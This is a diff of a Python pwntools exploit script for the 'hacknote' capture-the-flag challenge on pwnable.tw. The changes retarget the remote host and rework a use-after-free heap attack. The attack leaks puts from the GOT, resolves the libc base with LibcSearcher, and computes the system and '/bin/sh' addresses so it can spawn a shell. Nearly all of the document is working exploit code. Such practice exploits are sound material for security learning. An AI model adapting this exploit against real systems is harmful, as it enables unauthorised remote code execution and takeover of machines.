@@ -1,9 +1,9 @@
 from pwn import *
 from LibcSearcher import *
-context(arch = "", os = "Linux", log_level = "Debug")
+context(arch = "i386", os = "Linux", log_level = "Debug")
 elf = ELF("./hacknote")
 io = process("./hacknote")
-# io = remote("124.70.130.92", 60001)
+io = remote("chall.pwnable.tw", 10102)
 # gdb.attach(io)
 
 s       = lambda data               :io.send(data)
@@ -42,21 +42,23 @@ puts_func = 0x0804862B
 
 #! 0
 add(24, "A" * 8)
-#! 1
+#! 
 add(24, "B" * 8)
 delete(0)
 delete(1)
 #! 2
 #* alloc two info chunk with size 0x10 
-add(8, p32(puts_func) + p32(elf.got["printf"]))
+add(8, p32(puts_func) + p32(elf.got["puts"]))
 show(0)
 
-printf_addr = u32(rl()[:4].ljust(4, "\0"))
-log.info("printf address in libc is : " + hex(printf_addr))
-libc_addr = printf_addr - 0x49590
+puts_addr = u32(rl()[:4].ljust(4, "\0"))
+log.info("puts address in libc is : " + hex(puts_addr))
+libc = LibcSearcher('puts', puts_addr)
+libc_addr = puts_addr - libc.dump('puts')
+log.info("libc address is : " + hex(libc_addr))
 
-system_addr = libc_addr + 0x3ad80
-bin_sh_addr = libc_addr + 0x15ba3f
+system_addr = libc_addr + libc.dump('system')
+bin_sh_addr = libc_addr + libc.dump('str_bin_sh')
 log.info("/bin/sh address : " + hex(bin_sh_addr))
 delete(2)
 
